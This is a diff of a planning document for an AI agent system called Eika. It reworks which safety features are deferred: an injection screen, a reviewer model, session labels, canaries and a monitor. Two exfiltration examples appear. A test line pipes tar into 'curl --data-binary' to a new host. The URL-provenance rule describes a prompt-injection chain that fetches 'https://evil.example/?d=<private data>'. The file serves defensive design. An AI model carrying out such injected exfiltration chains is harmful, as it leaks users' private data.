@@ -1,7 +1,9 @@
 # Deferred work
 
 What was cut from `PLAN.md` on 2026-11-01, kept here so it can come back. The
-reasons are in `DECISIONS.md` ("What the first version leaves out").
+reasons are in `DECISIONS.md` ("What the first version leaves out"). On 2026-11-09
+the injection screen went back into the plan and labels were dropped
+(`DECISIONS.md`, "Safety without asking"), and this file was brought in line.
 
 Nothing here is started until its trigger fires. When one does, move the work
 into `PLAN.md` as a phase or items, then follow the plan's rules. The design for
@@ -14,9 +16,9 @@ the notes under "How it returns", which override them.
 | Order | Work | Bring it back when |
 |---|---|---|
 | 1 | Channels (phase 14) | The web app is in daily use and you want Eika in the chat app you already use. Matrix-Bot gives it a head start |
-| 2 | Reviewer (phase 8) | Asks become annoying, as measured from `audit` rows, or a private project is mostly approvals |
+| 2 | Reviewer (phase 8) | Plugin approvals become annoying, as measured from `audit` rows, and "always" on the card does not cover them |
 | 3 | Dreaming (phase 9) | The memory index goes over budget in real use, and stays there |
-| 4 | Injection screen (phase 8) | Injected content gets through in real use, in the logs |
+| 4 | Tighter rules ("Rules that tighten safety without asking", below) | `evals/injection` or real use shows an attack chain getting through |
 | 5 | Browser and vault (phases 12, 10) | A recurring task that no plugin or `web_fetch` can do |
 | 6 | Monitor (phase 13) | The reviewer has real decisions behind it, and the audit log shows misses |
 | Paired | Sentry's own container and the Docker socket proxy | You want Core to stop being root-equivalent on the host. One without the other buys little |
@@ -44,7 +46,6 @@ anyway, so the container and the socket proxy pay off together or not at all.
   in the vault. Core's MCP routes move or proxy to Sentry's user routes.
 - Approvals checked with `SELECT` on `core.auth_sessions`, and Sentry's event stream
   relayed by Core on `inbox`.
-- `/v1/labels`, if labels are tracked by then.
 - Benchmarks: `decide` p99 under 2 ms over the socket, proxy overhead under 1 ms.
 - A Docker socket proxy in front of Core, allowing only container operations on
   Eika-labelled objects.
@@ -59,10 +60,11 @@ The phase splits in two, and they return separately.
 talking only to `/v1/systemone`, on the d3-flash the bench already runs: the design's
 numbers have emulation allowing 50% of steered attacks against d3-flash's 17%. Leave
 out emulation, Laya, OpenDecider and hosted Jev. Drop the `reversible` question,
-which no verdict reads. The rows of `design/sentry.md` 5 marked for review flip from
-`ask` to `review`, and only then does it make sense to bring back `subagent` and
-`until` grants or dynamic labels. `decision` is already a model kind and a class,
-and nothing calls it. The items are:
+which no verdict reads. Its job is narrower than it was: plugin tools set to `ask`
+get a `review` verdict first, and the user is asked only when the reviewer is
+unsure. It does not bring back asks for fetches or commands, and there are no
+labels for it to read. `decision` is already a model kind and a class, and nothing
+calls it. The items are:
 
 - `internal/systemone`: wire types, thresholds and a client for any `/v1/systemone`
   endpoint. The wire types follow what llama.cpp serves, checked against the bench:
@@ -70,21 +72,25 @@ and nothing calls it. The items are:
   come back as `{"noul": p}` and `{"choice", "probabilities", "confidence"}`.
 - Reviewer: isolated state capped at 16k tokens (a setting), its questions and
   user-adjustable thresholds, a 5 s cut-off that becomes `ask`. Turn on the `review`
-  verdict: external sends and deletes in every session, and fetches and `bash`
-  commands in labelled ones.
+  verdict for plugin tools set to `ask`.
 - A live suite: the reviewer on the bench's d3-flash, over a fixed set of benign and
-  dangerous actions (a weather `curl` versus `tar … | curl --data-binary` to a new
-  host from a `sensitive` session) plus their steered variants; verdicts, p50 latency
-  and the 5 s cut-off recorded.
+  dangerous plugin calls (a reply to the sender versus a forward of the inbox to a
+  new address) plus their steered variants; verdicts, p50 latency and the 5 s
+  cut-off recorded.
 - Settings warns when `decision` shares a pool with `main` without a spare slot.
 
-**Injection screen.** It is evidence, never a barrier, and it needs a Python sidecar.
-It brings `suspicious` back, and with it dynamic labels. One-time code removal did
-not wait for this: it is deterministic and moved to phase 11.
+**Injection screen.** No longer deferred. It is phase 4 of the plan, as the `guard`
+service, and it removes what it flags instead of setting a label
+(`design/sentry.md` 6). What stays here from the old phase is the suite behind the
+model recommendation (`evals/screen`, below as `evals/sentry/screen`), for when
+another model or revision is to be checked.
 
 ### Items as planned
 
-Design: `design/sentry.md` sections 6 and 9.
+Design: `design/sentry.md` sections 6 and 9. The items on the `guard/` sidecar,
+ingest, the screen at skill install and routine creation, `evals/sentry` and the
+live suite are in the plan now (phases 4, 6, 7 and `evals/injection`), without the
+`suspicious` flag. They stay below as they were written.
 
 - Extend `internal/systemone` (added in phase 4): hosted Jev and
   `laya-serve`, and probing.
@@ -191,9 +197,9 @@ It returns with the browser, or when a real secret is needed from `bash`. Plugin
 credentials do not need it: they stay sealed in Core with `internal/secret`. Leave
 out X25519 and WebCrypto in secure entry. Core serves the page that would do the
 encrypting, so it protects nothing a plain pass-through to Sentry with the log test
-does not. Canaries come with this phase, since TLS interception is what lets the
-proxy see a key read from the environment; until then a canary only trips on a
-literal value.
+does not. The canary key in `home` is in phase 4 of the plan and trips on its
+literal value in a tool call. What comes with this phase is TLS interception, which
+lets the proxy see a key read from the environment, and the vault-looking file.
 
 ### Items as planned
 
@@ -238,15 +244,22 @@ Design: `design/sentry.md` section 8.
 
 ### How it returns
 
+Before any of it, try a browser MCP server (Playwright MCP) as a plugin, once
+plugins are in. It gets tool settings, approvals and ingest for nothing, and may be
+enough for the recurring task that triggered this. Build the service below only for
+what that cannot do: the live view, takeover and logins.
+
 In stages, each usable alone:
 1. Anonymous and read-only: the service, the container, snapshots, `find` and `read`.
 2. The live view.
 3. Logins, form decisions, hand-offs and takeover, with phase 10.
 
-Its exit says "Nothing is submitted without approval", which is wrong: a clean
-session's submit is `allow`, and a labelled one's goes to the reviewer
-(`design/browser.md` 4). Correct it when the phase returns. Images in tool results
-come back with it.
+`design/browser.md` decides form submits by session label, and labels are gone.
+When the phase returns, a submit needs a rule of its own in the "What asks" table,
+with a `DECISIONS.md` entry: most likely an ask per site with "always for this
+site", and a hand-off for account creation, passwords and payments. Page content
+goes through ingest like any other untrusted source. Images in tool results come
+back with it.
 
 ### Items as planned
 
@@ -367,7 +380,32 @@ as its own container". The last item stays the plan's closing step.
 - Threat model review against `design/README.md`, and a self pen-test
   checklist run.
 - Final docs: `docs/design/` is empty or holds only deferred items. Delete
-  this plan and `REFACTOR_PLAN.md`.
+  the plan and its log.
+
+## Rules that tighten safety without asking
+
+The plan's safety leaves gaps it names (`design/sentry.md` 6, "What this does not
+stop"). When `evals/injection` or real use shows one of them being used, these are
+the next steps, in the order to try them. Each is a rule or a narrower capability.
+None is an ask.
+
+- **A project on its own computer in allowlist mode.** The project names the hosts
+  its worker may reach (a package registry, its git remote), and nothing else
+  leaves. This is the answer for a project whose files must not leak. It needs the
+  project `computer` field (trimmed from phase 2) and a UI for the allowlist.
+- **A URL-provenance rule for `web_fetch`.** A fetch is allowed when its URL came
+  from the user, from a search result, or from a page already fetched in the
+  session, or when it has no query string and a short path. Anything else, such as
+  a URL the model composed with data in it, is denied with a reason. It closes the
+  chain where an injected Eika briefs a researcher to fetch
+  `https://evil.example/?d=<private data>`. The cost is a false deny on API URLs
+  the model builds honestly, so measure it on the live suites first.
+- **Screening `bash` output and file reads.** Only for output that came from the
+  network, or for all of it, behind a setting. The model was not measured on logs
+  and code, so run `evals/screen` on such text first.
+- **No `web_fetch` for a researcher started from a session that read plugin
+  content.** A capability rule: mail goes in, nothing composed goes out. It is
+  coarse, and close to a label, so it is last.
 
 ## Trimmed from the kept phases
 
@@ -422,27 +460,34 @@ All of phase 1's code stays. These were cut before more time went into them:
 
 ### Phase 4
 
-- Grant scopes `subagent` and `until`, approval grouping and the push digest. Return
-  with the reviewer: they exist to make a labelled session's asks bearable.
-- Dynamic labels: `private?`, `suspicious`, reports and history hits carrying a label,
-  and clearing at compaction. Return with the injection screen, or when labels need
-  to be finer than a session. Whatever replaces them must fix one thing: clearing
-  `sensitive` at compaction launders a label, since the rolling summary can still
-  hold the private data.
+- Labels, all of them: `sensitive`, `private` projects, `suspicious`, and the asks
+  they caused before fetches and commands. Dropped, not deferred (`DECISIONS.md`,
+  "Safety without asking"). If something like them returns, it returns as a rule
+  from the section above, and it must not launder: clearing a label at compaction
+  did, since the rolling summary can still hold the private data.
+- Grant scopes `routine`, `subagent` and `until`, approval grouping and the push
+  digest. They existed to make a labelled session's asks bearable. Return only if
+  plugin approvals pile up in a way "always" does not cover.
 - Per-run proxy credentials. They only attribute traffic, since no verdict reads
   them. Return with the monitor's volume tripwire.
 - The audit timeline UI, export and retention setting, and asks per active day.
+- Audit rows for plain allows. The session's events already hold every tool call.
 - Outbound detectors beyond credentials: Luhn, account numbers, ID formats. They were
   a hard deny with no override, so Eika could never send the user's own IBAN to their
-  accountant. They return only as an `ask`.
-- Tool settings moved to phase 11, where they first have anything to act on.
+  accountant. A plugin send already asks, so they return, if at all, as a line on
+  its approval card.
+- Approvals, grants and tool settings moved to phase 11, where they first have
+  anything to act on.
 
 ### Phase 5
 
 - Project memory scope, and memory access for subagents. A project's living summary
   is a `STATUS.md` in its directory. Return when briefs prove too thin.
-- `sensitivity`. It returns with dynamic labels; only `eika` reads memory now, and
-  its sessions are always `sensitive`.
+- `sensitivity`. Dropped with labels; only `eika` reads memory.
+- `provenance` and the instruction-shape check. The screen on the memory's body
+  replaced them (`design/memory.md` 6): a word list with a quote check sends a
+  paraphrased preference to pending and passes a planted instruction that avoids
+  the words.
 - The recall hint. The design's own research says agents with search do as well.
 - Score-based index selection, `use_count` and `last_used_at`.
 - The types `project`, `decision`, `feedback`, `reference` and `event`.
@@ -457,8 +502,8 @@ All of phase 1's code stays. These were cut before more time went into them:
 - Pinned plugin tools, schema validation before a call (the server rejects bad
   arguments anyway), resources through `plugin_call`, and the most-used ranking.
 - Plugin notifications as triggers, and forgetting memories on disconnect.
-- The `private` and `trusted` plugin flags. Return with dynamic labels and the
-  injection screen, which they act on.
+- The `private` plugin flag. Dropped with labels. `trusted` is in the plan: a
+  trusted plugin's results are scored but never have anything removed.
 - Plugins for subagents.
 
 ### Phase 7
@@ -471,6 +516,8 @@ All of phase 1's code stays. These were cut before more time went into them:
   the UI.
 - Urgency judging (`needs_attention_now`).
 - The Check-in routine, disabled by default.
+- The `routine` grant scope. A routine's runs follow the same rules as any other
+  run, and a plugin tool it needs is set to `allow` or pinned from its first card.
 
 ### Phase 6
 
@@ -483,10 +530,8 @@ All of phase 1's code stays. These were cut before more time went into them:
 
 ### Other ideas already deferred
 
-- **Per-value capability tracking (CaMeL):** only if session-level labels prove too
-  coarse.
-- **An untrusted-content label.** Dropped (`design/sentry.md` 6). Revisit only if
-  injected sessions without sensitive data do real harm within the defaults.
+- **Per-value capability tracking (CaMeL):** only if the rules above it in this
+  file prove too coarse.
 - **Chapters for home compaction**, behind `evals/compaction`.
 - **Voice and an email address for Eika:** after channels.
 - **Several browser identities and profiles:** after the browser.
